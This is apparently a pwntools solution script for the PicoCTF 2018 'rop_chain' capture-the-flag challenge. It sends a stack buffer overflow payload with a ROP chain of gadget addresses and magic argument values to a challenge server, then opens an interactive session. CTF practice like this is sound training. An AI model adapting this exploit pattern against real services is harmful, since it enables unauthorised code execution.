from pwn import *

elf = ELF('./PicoCTF_2018_rop_chain')

local = 0
if local == 1:
    io = process('./PicoCTF_2018_rop_chain')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
    io = remote('node4.buuoj.cn',26467)

payload = 'a'*0x18+p32(0xdeadbeef)+p32(0x80485CB)+p32(0x80485D8)+p32(0x804862B)+p32(0xBAAAAAAD)+p32(0xDEADBAAD)
io.recvuntil("input> ")
io.sendline(payload)

io.interactive()
